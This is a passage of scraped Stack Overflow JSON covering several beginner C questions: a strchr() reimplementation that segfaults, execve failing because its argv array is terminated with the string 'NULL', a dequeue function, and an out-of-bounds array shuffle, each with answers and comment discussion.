"https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1482936553, "post_id": 41364207, "comment_id": 69930079, "body": "@BLUEPIXY any input will produce the error. I&#39;m working in a Debian running in an Oracle VM VirtualBox. Once my code worked fine for coderredoc I have no idea if this environment can have something to do with this fault."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482936577, "post_id": 41364207, "comment_id": 69930089, "body": "Have you got Caps Lock on?"}, {"owner": {"reputation": 53, "user_id": 6173472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6539f889a9c279a0a0fe012e8301f99?s=128&d=identicon&r=PG&f=1", "display_name": "ulissesBR", "link": "https://stackoverflow.com/users/6173472/ulissesbr"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482936659, "post_id": 41364207, "comment_id": 69930144, "body": "@WeatherVane I&#39;ll try to work on this. But anyway, even if I type H the fault happens... Very strange!"}, {"owner": {"reputation": 53, "user_id": 6173472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6539f889a9c279a0a0fe012e8301f99?s=128&d=identicon&r=PG&f=1", "display_name": "ulissesBR", "link": "https://stackoverflow.com/users/6173472/ulissesbr"}, "edited": false, "score": 0, "creation_date": 1482936761, "post_id": 41364207, "comment_id": 69930199, "body": "Guys, thanks a lot... BLUEPIXY and WeatherVane, the problem is really trying to print the NULL contents. I&#39;ll work on it!"}, {"owner": {"reputation": 53, "user_id": 6173472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6539f889a9c279a0a0fe012e8301f99?s=128&d=identicon&r=PG&f=1", "display_name": "ulissesBR", "link": "https://stackoverflow.com/users/6173472/ulissesbr"}, "edited": false, "score": 0, "creation_date": 1482937004, "post_id": 41364207, "comment_id": 69930346, "body": "Guys, thank you so much, I just added an if statement that tests if b == NULL and now works like a charm. Thanks a lot for everything!"}], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 6173472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6539f889a9c279a0a0fe012e8301f99?s=128&d=identicon&r=PG&f=1", "display_name": "ulissesBR", "link": "https://stackoverflow.com/users/6173472/ulissesbr"}, "edited": false, "score": 0, "creation_date": 1482936946, "post_id": 41364324, "comment_id": 69930309, "body": "thanks a lot for your answer, this was the problem! I solved it adding an if statement to test if b is NULL and now works like a charm! Thanks everyone!"}], "tags": [], "owner": {"reputation": 37741, "user_id": 3425536, "user_type": "registered", "accept_rate": 72, "profile_image": "https://graph.facebook.com/1484495923/picture?type=large", "display_name": "emlai", "link": "https://stackoverflow.com/users/3425536/emlai"}, "is_accepted": true, "score": 5, "last_activity_date": 1482936292, "creation_date": 1482936292, "answer_id": 41364324, "question_id": 41364207, "link": "https://stackoverflow.com/questions/41364207/could-anyone-help-me-to-understand-this-strchr-c-segmentation-fault/41364324#41364324", "title": "Could anyone help me to understand this strchr() C Segmentation fault?", "body": "<p>When <code>my_strchr</code> doesn't find the character in the string, it returns <code>NULL</code>.</p>\n\n<p>In this case <code>b</code> is <code>NULL</code> so <code>*b</code> is undefined behavior, which explains the segfault.</p>\n\n<p>You might want to check the result of <code>my_strchr</code> before printing <code>*b</code>, e.g.:</p>\n\n<pre><code>if (b != NULL) {\n  printf(\"Character found! %c\\n\", *b);\n} else {\n  printf(\"Not found...\\n\");\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 53, "user_id": 6173472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6539f889a9c279a0a0fe012e8301f99?s=128&d=identicon&r=PG&f=1", "display_name": "ulissesBR", "link": "https://stackoverflow.com/users/6173472/ulissesbr"}, "edited": false, "score": 1, "creation_date": 1482939640, "post_id": 41364685, "comment_id": 69931828, "body": "Thanks @Raphael, I&#39;ll dig on it. Anyway, the reference I was following tells that, when passing a string as an argument, function argument should be a constant to avoid any modifications in the string."}, {"owner": {"reputation": 656, "user_id": 1869741, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c0f291b977b2099cf9c183aafa6d6a10?s=128&d=identicon&r=PG", "display_name": "Raphael Teubner", "link": "https://stackoverflow.com/users/1869741/raphael-teubner"}, "reply_to_user": {"reputation": 53, "user_id": 6173472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6539f889a9c279a0a0fe012e8301f99?s=128&d=identicon&r=PG&f=1", "display_name": "ulissesBR", "link": "https://stackoverflow.com/users/6173472/ulissesbr"}, "edited": false, "score": 0, "creation_date": 1482939923, "post_id": 41364685, "comment_id": 69932014, "body": "That&#39;s right, if you do not modify it. but then what&#39;s the point of returning a char* ?If you don&#39;t do anything with it you could just check like it does something that&#39;s ok then returning. void or else but yeah it&#39;s just to avoid compiler Warnings it&#39;s recommendation."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 3, "creation_date": 1482952845, "post_id": 41364685, "comment_id": 69938355, "body": "This is just bad advice concerning <code>const</code>-correctness. You should read the function prototype for the standard library version: <code>strchr(const char *string, int c)</code>. In this case, the <code>const</code> indicates that the value stored at the location pointed to by <code>string</code> can not be modified; but the value of the pointer itself can be modified (to loop through the string, for example). When emulating library functions, it is best to stick the the standard prototypes and to try to understand why they are written that way. OP was doing this."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1482953208, "post_id": 41364685, "comment_id": 69938495, "body": "Also, I recommend reading the <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">C Standard</a> for reference. The standard does discuss library requirements. You should also read the manual for whatever standard library implementation you are using. For gcc, here is the <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">manual for glibc</a>."}, {"owner": {"reputation": 656, "user_id": 1869741, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c0f291b977b2099cf9c183aafa6d6a10?s=128&d=identicon&r=PG", "display_name": "Raphael Teubner", "link": "https://stackoverflow.com/users/1869741/raphael-teubner"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1483018176, "post_id": 41364685, "comment_id": 69963210, "body": "@DavidBowling I did what it was supose to do without compiler warnings,but thanks for the advice I will also check."}], "tags": [], "owner": {"reputation": 656, "user_id": 1869741, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c0f291b977b2099cf9c183aafa6d6a10?s=128&d=identicon&r=PG", "display_name": "Raphael Teubner", "link": "https://stackoverflow.com/users/1869741/raphael-teubner"}, "is_accepted": false, "score": 0, "last_activity_date": 1482937643, "creation_date": 1482937643, "answer_id": 41364685, "question_id": 41364207, "link": "https://stackoverflow.com/questions/41364207/could-anyone-help-me-to-understand-this-strchr-c-segmentation-fault/41364685#41364685", "title": "Could anyone help me to understand this strchr() C Segmentation fault?", "body": "<p>There are some logic issue like tuple_cat said.</p>\n\n<p>But I also think you don't understand some concept, your code is not clean from my point of view.</p>\n\n<p>I guess you just started coding in c so keep coding :)</p>\n\n<p>First you return a char* in your function but you define argument of the function as </p>\n\n<pre><code>char* my_strchr(const char* str, int c)\n</code></pre>\n\n<p>In standard C you can't touch a constant you can't modify it that's the point of declaring a constant.</p>\n\n<p>so change the function to </p>\n\n<pre><code>char* my_strchr(char* str, int c)\n</code></pre>\n\n<p>Then the correct way to return a char from a string is not </p>\n\n<pre><code>return (char*)str;\n</code></pre>\n\n<p>but just </p>\n\n<pre><code>return str;\n</code></pre>\n\n<p>At the end of your function.</p>\n\n<p>This way you will send the address of the first char in char* (string).\nIn a char* you do that by just giving the variable name.</p>\n\n<p>I encourage you to read: <a href=\"https://www.gnu.org/software/gnu-c-manual/gnu-c-manual.html\" rel=\"nofollow noreferrer\">https://www.gnu.org/software/gnu-c-manual/gnu-c-manual.html</a></p>\n\n<p>RTFM !!! the char* part at 1.3.4 String Constants</p>\n\n<p>Anyway good luck in your learning.</p>\n"}], "owner": {"reputation": 53, "user_id": 6173472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6539f889a9c279a0a0fe012e8301f99?s=128&d=identicon&r=PG&f=1", "display_name": "ulissesBR", "link": "https://stackoverflow.com/users/6173472/ulissesbr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 867, "favorite_count": 0, "accepted_answer_id": 41364324, "answer_count": 2, "score": 0, "last_activity_date": 1482937643, "creation_date": 1482935861, "last_edit_date": 1482936699, "question_id": 41364207, "link": "https://stackoverflow.com/questions/41364207/could-anyone-help-me-to-understand-this-strchr-c-segmentation-fault", "title": "Could anyone help me to understand this strchr() C Segmentation fault?", "body": "<p>I'm diving into pointers and strings in C and I'm still getting used to some concepts. I tried to implement a version of the <code>strchr()</code> function \u2013 the same as in string.h \u2013 for study purposes, but something basic is still not right.</p>\n\n<p>Here's my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nchar* my_strchr(const char* str, int c){\n  if (str == NULL){\n    printf(\"STR is NULL. Finishing the program\\n\");\n    return NULL;\n  }\n  while (*str != '\\0'){\n    if (*str == c){\n      return (char*) str;\n    }\n    str++;\n  }\n  return NULL;\n}\n\nint main(){\n  char *a = \"Hello World!\";\n  char *b;\n  char c;\n\n  printf(\"Type the character you want to find in the Hello World! string:\\n\");\n  scanf(\" %c\", &amp;c);\n\n  b = my_strchr(a, c);\n\n  printf(\"Character found! %c\\n\", *b);\n\n  return 0;\n}\n</code></pre>\n\n<p>I'm trying to figure out why this is returning a segmentation error. When I use gbd, it tells me that the error is in the last <code>printf</code>, which tries to print the <code>*b</code>.</p>\n\n<p>Once <code>my_strchr()</code> returns a <code>(char*) str</code>, I'd have to store this return value in a <code>char</code> pointer variable, right?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1482936222, "post_id": 41364112, "comment_id": 69929882, "body": "It won&#39;t cause an error <i>per se</i>, but it&#39;s suspicious that you <code>wait()</code> for the first child before forking the second.  If the two children are meant to run sequentially then that&#39;s just the way to do it, but if they&#39;re meant to run simultaneously then the parent should not wait until after it has forked both children."}, {"owner": {"reputation": 161, "user_id": 7337678, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8511ae532a213ac7681e74f6410634dc?s=128&d=identicon&r=PG&f=1", "display_name": "Leo", "link": "https://stackoverflow.com/users/7337678/leo"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1482940590, "post_id": 41364112, "comment_id": 69932376, "body": "Thanks for the tip. It should work simultaneously, so I&#39;ll try what you suggested."}], "answers": [{"tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": true, "score": 14, "last_activity_date": 1482935788, "creation_date": 1482935788, "answer_id": 41364192, "question_id": 41364112, "link": "https://stackoverflow.com/questions/41364112/execve-is-giving-bad-address/41364192#41364192", "title": "Execve is giving bad address", "body": "<p>You are not terminating the argument array correctly:</p>\n\n<pre><code>    char* argv[]={\"Test\", \"Test_1\", \"NULL\"};\n</code></pre>\n\n<p><code>\"NULL\"</code> is a string literal, it's not same as <code>NULL</code>. The array needs to be terminated with a null pointer. Instead do:</p>\n\n<pre><code>    char* argv[]={\"Test\", \"Test_1\", (char*)0};\n</code></pre>\n\n<p>Similarly, fix the other argument array.</p>\n"}, {"tags": [], "owner": {"reputation": 339, "user_id": 2125221, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vIyyJ.png?s=128&g=1", "display_name": "Agguro", "link": "https://stackoverflow.com/users/2125221/agguro"}, "is_accepted": false, "score": 1, "last_activity_date": 1523441569, "creation_date": 1523441569, "answer_id": 49772339, "question_id": 41364112, "link": "https://stackoverflow.com/questions/41364112/execve-is-giving-bad-address/49772339#49772339", "title": "Execve is giving bad address", "body": "<p>or you have to change \"NULL\" to simply NULL.  In the case \"NULL\" you give NULL as a commandline parameter. The case NULL without \" means end of argument list.</p>\n"}], "owner": {"reputation": 161, "user_id": 7337678, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8511ae532a213ac7681e74f6410634dc?s=128&d=identicon&r=PG&f=1", "display_name": "Leo", "link": "https://stackoverflow.com/users/7337678/leo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6500, "favorite_count": 0, "accepted_answer_id": 41364192, "answer_count": 2, "score": 3, "last_activity_date": 1523441569, "creation_date": 1482935522, "question_id": 41364112, "link": "https://stackoverflow.com/questions/41364112/execve-is-giving-bad-address", "title": "Execve is giving bad address", "body": "<p>I'm having a little problem with the execve command. The program Test should create two children and each one should run an execve to load and run another program. But I'm getting a bad address on both the execve. The code is as follows:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;time.h&gt;\n#include &lt;sys/ipc.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\n\nint main(){\n    int child_1, child_2;\n\n    child_1=fork();\n    if(child_1==0){\n        char* argv[]={\"Test\", \"Test_1\", \"NULL\"};\n        if((execve(\"Test_1\", argv, NULL))&lt;0) perror(\"execve 1 fail\");\n        exit(0);\n    }else if(child_1&lt;0)perror(\"error fork\");\n    else wait(NULL);\n\n    child_2=fork();\n    if(child_2==0){\n        char* argv1[]={\"Test\", \"Test_2\", \"NULL\"};\n        if((execve(\"Test_2\", argv1, NULL))&lt;0) perror(\"execve 2 fail\");\n        exit(0);\n    }else if(child_2&lt;0)perror(\"error fork\");\n    else wait(NULL);\nreturn 0;\n}\n</code></pre>\n"}, {"tags": ["c", "algorithm", "data-structures"], "comments": [{"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 2, "creation_date": 1482932282, "post_id": 41363232, "comment_id": 69927695, "body": "How can we know? We can only guess, this question is too broad. You don&#39;t provide an <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. We don&#39;t know about <code>queue_t</code>."}, {"owner": {"reputation": 45685, "user_id": 69809, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/yCVF0.jpg?s=128&g=1", "display_name": "Groo", "link": "https://stackoverflow.com/users/69809/groo"}, "edited": false, "score": 1, "creation_date": 1482932391, "post_id": 41363232, "comment_id": 69927741, "body": "Your code example doesn&#39;t return any value from the queue, so my guess would be that you need to return the actual dequeued value through the <code>int* val</code> parameter, and return the status result. Also, if this is a circular buffer, then <code>q-&gt;size</code> is redundant (and will make problems with concurrent access)."}], "answers": [{"tags": [], "owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "is_accepted": true, "score": 1, "last_activity_date": 1482935710, "creation_date": 1482935710, "answer_id": 41364160, "question_id": 41363232, "link": "https://stackoverflow.com/questions/41363232/dequeing-a-specific-value-from-a-queue/41364160#41364160", "title": "Dequeing a specific value from a queue?", "body": "<p>The return value of <code>dequeue</code> is probably for telling whether or not the function successfully dequeued some data while <code>val</code> is supposed to hold the dequeued data (if any).</p>\n\n<p>Assuming that your queue has an array <code>data</code> holding the <code>int</code>values, it could be like:</p>\n\n<pre><code>int dequeue(queue_t* q, int* val) \n{\n   if(q-&gt;size==0){\n     printf(\"Queue is Empty\\n\");\n     return QUEUE_IS_EMPTY;\n   }\n   else \n   {\n      printf(\"Dequeueing\\n\");\n\n      *val = q-&gt;data[q-&gt;front];   // Here you set the data value\n\n      q-&gt;size--;\n      q-&gt;front++;\n      if (q-&gt;front == q-&gt;capacity)\n      {\n         q-&gt;front = 0;\n      }\n   }\n   return 0;\n}\n</code></pre>\n\n<p>Then it can be used like:</p>\n\n<pre><code>int d;\nif (dequeue(myQueue, &amp;d) != QUEUE_IS_EMPTY)\n{\n   printf(\"dequeued value is %d\\n\", d);\n}\nelse\n{\n   printf(\"not data available\\n\");\n}\n</code></pre>\n"}], "owner": {"reputation": 1121, "user_id": 6534957, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/b22a14c11731ad5fe040cf9acbc7e40b?s=128&d=identicon&r=PG&f=1", "display_name": "Jerzy Gruszka", "link": "https://stackoverflow.com/users/6534957/jerzy-gruszka"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "accepted_answer_id": 41364160, "answer_count": 1, "score": -1, "last_activity_date": 1482935710, "creation_date": 1482932107, "question_id": 41363232, "link": "https://stackoverflow.com/questions/41363232/dequeing-a-specific-value-from-a-queue", "title": "Dequeing a specific value from a queue?", "body": "<p>I have to implement a method that is supposed to do:</p>\n\n<pre><code>// int dequeue(queue_t* q, int* number);\n</code></pre>\n\n<p>But I wonder what is the point of second argument since dequeing always takes the last value. I use circular buffer to implement it. My initial thought is :</p>\n\n<pre><code> int dequeue(queue_t* q, int* val) {\n   if(q-&gt;size==0){\n   printf(\"Queue is Empty\\n\");\n   return QUEUE_IS_EMPTY;\n}\nelse {\n   printf(\"Dequeueing\\n\");\n   q-&gt;size--;\n   q-&gt;front++;\n   if (q-&gt;front == q-&gt;capacity)\n   {\n      q-&gt;front = 0;\n   }\n  }\n  return 0;\n  }\n</code></pre>\n\n<p>I wonder it is a mistake like copy paste or sth ?</p>\n"}, {"tags": ["c", "arrays", "variables", "constants", "shuffle"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1482932161, "post_id": 41363036, "comment_id": 69927627, "body": "<code>tmp=(int)array[i];</code>...why?"}, {"owner": {"reputation": 51, "user_id": 7036526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/39e835dd5de2bdad11a740357092c5e4?s=128&d=identicon&r=PG&f=1", "display_name": "Carlo Di Dato", "link": "https://stackoverflow.com/users/7036526/carlo-di-dato"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1482932547, "post_id": 41363036, "comment_id": 69927833, "body": "To avoid this warning:"}, {"owner": {"reputation": 51, "user_id": 7036526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/39e835dd5de2bdad11a740357092c5e4?s=128&d=identicon&r=PG&f=1", "display_name": "Carlo Di Dato", "link": "https://stackoverflow.com/users/7036526/carlo-di-dato"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1482932579, "post_id": 41363036, "comment_id": 69927858, "body": "warning: assignment makes integer from pointer without a cast [-Wint-conversion]    tmp=array[i];       ^"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1482932591, "post_id": 41363036, "comment_id": 69927864, "body": "not the cast, why the whole statement is there? it&#39;s implementation defined behaviour, don;t rely on that."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482932759, "post_id": 41363036, "comment_id": 69927988, "body": "tmp should be <code>char *</code> instead of <code>int</code>."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482934106, "post_id": 41363036, "comment_id": 69928711, "body": "Your title is not correct. Your main difference is making a global variable a local automatic one. The array itself is not const in any of your 2 versions."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1482938173, "post_id": 41363036, "comment_id": 69931030, "body": "@Gerhardh-- <code>array</code> is an array of pointers to <code>const char</code>, as declared in the first version. The pointers themselves are of course not <code>const</code>. OP has 2 problems here: the cast to <code>int</code>, which is wrong; storing a <code>const</code> value in a non-<code>const</code>-qualified type, which could lead to undefined behavior."}], "answers": [{"comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1482932416, "post_id": 41363218, "comment_id": 69927756, "body": "Out of array, picking the nul termination char which explains null char output"}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1482932714, "post_id": 41363218, "comment_id": 69927943, "body": "@Jean-Fran&#231;oisFabre no, not at all. Even if <code>array</code> was nul-terminated (it&#39;s not), the null would still be within its bounds. This is simply UB."}, {"owner": {"reputation": 51, "user_id": 7036526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/39e835dd5de2bdad11a740357092c5e4?s=128&d=identicon&r=PG&f=1", "display_name": "Carlo Di Dato", "link": "https://stackoverflow.com/users/7036526/carlo-di-dato"}, "edited": false, "score": 0, "creation_date": 1482932764, "post_id": 41363218, "comment_id": 69927993, "body": "pbn, your suggestion works, thanks. But I still not understand why, declaring the variable char *array in the main function, the program works :-\\"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1482932833, "post_id": 41363218, "comment_id": 69928031, "body": "Oh you are right. It is just that strings written that way are weird."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1482932889, "post_id": 41363218, "comment_id": 69928061, "body": "There is no string involved at all. It is an array of pointers, not an array of char."}, {"owner": {"reputation": 1632, "user_id": 2429333, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5eb897104dc190de7ea7da0ac29a59ae?s=128&d=identicon&r=PG", "display_name": "pbn", "link": "https://stackoverflow.com/users/2429333/pbn"}, "reply_to_user": {"reputation": 51, "user_id": 7036526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/39e835dd5de2bdad11a740357092c5e4?s=128&d=identicon&r=PG&f=1", "display_name": "Carlo Di Dato", "link": "https://stackoverflow.com/users/7036526/carlo-di-dato"}, "edited": false, "score": 0, "creation_date": 1482933038, "post_id": 41363218, "comment_id": 69928134, "body": "@CarloDiDato your second version of code does not work for me, it results in segmentation fault"}, {"owner": {"reputation": 51, "user_id": 7036526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/39e835dd5de2bdad11a740357092c5e4?s=128&d=identicon&r=PG&f=1", "display_name": "Carlo Di Dato", "link": "https://stackoverflow.com/users/7036526/carlo-di-dato"}, "edited": false, "score": 0, "creation_date": 1482933965, "post_id": 41363218, "comment_id": 69928646, "body": "@pbn different OS and or compiler? On windows I can compile and run it C:/TDM-GCC-32/bin/gcc.exe -c  &quot;C:/test/shuffle/shuffle/main.c&quot; -g -O0 -Wall  -o ./Debug/main.c.o -I. -I. C:/TDM-GCC-32/bin/g++.exe -o ./Debug/shuffle @&quot;shuffle.txt&quot; -L. mingw32-make.exe[1]: Leaving directory &#39;C:/test/shuffle/shuffle&#39; ====0 errors, 0 warnings===="}, {"owner": {"reputation": 51, "user_id": 7036526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/39e835dd5de2bdad11a740357092c5e4?s=128&d=identicon&r=PG&f=1", "display_name": "Carlo Di Dato", "link": "https://stackoverflow.com/users/7036526/carlo-di-dato"}, "edited": false, "score": 0, "creation_date": 1482934832, "post_id": 41363218, "comment_id": 69929167, "body": "@pbn, I compiled both codes on Linux (Debian) using gcc, no segmentation fault but same behaviour."}], "tags": [], "owner": {"reputation": 1632, "user_id": 2429333, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5eb897104dc190de7ea7da0ac29a59ae?s=128&d=identicon&r=PG", "display_name": "pbn", "link": "https://stackoverflow.com/users/2429333/pbn"}, "is_accepted": true, "score": 3, "last_activity_date": 1482932320, "last_edit_date": 1482932320, "creation_date": 1482932070, "answer_id": 41363218, "question_id": 41363036, "link": "https://stackoverflow.com/questions/41363036/null-pointer-using-const-instead-of-variable-declaration/41363218#41363218", "title": "Null pointer using const instead of variable declaration", "body": "<p>Start loop from <code>size-1</code>, you are pointing out of array in <code>array[size]</code> (first loop iteration).</p>\n\n<pre><code> for (i=size-1; i&gt;=0; i--)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "is_accepted": false, "score": 0, "last_activity_date": 1482938213, "last_edit_date": 1482938213, "creation_date": 1482936187, "answer_id": 41364292, "question_id": 41363036, "link": "https://stackoverflow.com/questions/41363036/null-pointer-using-const-instead-of-variable-declaration/41364292#41364292", "title": "Null pointer using const instead of variable declaration", "body": "<p>You should avoid casting whenever possible, and it is rarely necessary to do so.</p>\n\n<p>Unless you plan on using <code>argc</code> and <code>argv[]</code>, use the simpler form for <code>main()</code>: <code>int main(void)</code>. This will remove some compiler warnings, and you should have these enabled; remove <em>all</em> warnings emitted by your compiler.</p>\n\n<p>You cast a pointer to <code>char</code> to 